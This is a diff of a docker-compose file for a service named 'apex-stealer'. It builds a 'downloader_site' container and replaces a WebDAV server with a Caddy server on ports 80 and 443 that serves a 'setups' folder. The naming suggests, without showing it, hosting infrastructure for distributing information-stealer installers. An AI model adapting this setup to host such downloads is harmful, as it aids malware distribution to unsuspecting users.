@@ -1,37 +1,37 @@
+version: "3.9"
+
 services:
   apex-stealer:
-    image: ghcr.io/michelgerding/apex-stealer:latest
-    build: .
+    build: ./downloader_site
     container_name: apex-stealer
     restart: unless-stopped
     volumes:
-      - ./config.json:/app/config.json
-      - setups:/app/setups
-    ports:
-      - "3000:3000"
+      - /opt/stacks/apex-stealer/config.json:/app/config.json
+      - /opt/stacks/apex-stealer/setups:/app/setups
     networks:
       - apex-network
 
-  webdav:
-    image: dgraziotin/nginx-webdav-nononsense
-    container_name: apex-webdav
+  caddy:
+    build: ./caddy
+    container_name: apex-caddy
     restart: unless-stopped
-    environment:
-      - WEBDAV_USERNAME=apex
-      - WEBDAV_PASSWORD=apex
-      - SERVER_NAMES=localhost
-      - TIMEOUTS_S=1200
-      - PUID=1000
-      - PGID=1000
-    volumes:
-      - setups:/data:ro
     ports:
       - "80:80"
+      - "443:443"
+    environment:
+      - ACME_AGREE=true
+    volumes:
+      - /opt/stacks/caddy_webdav/Caddyfile:/etc/caddy/Caddyfile
+      # Map the data folder
+      - /opt/stacks/apex-stealer/setups:/opt/setups:ro
+      - caddy_data:/data
+      - caddy_config:/config
     networks:
       - apex-network
 
 volumes:
-  setups:
+  caddy_data:
+  caddy_config:
 
 networks:
   apex-network:
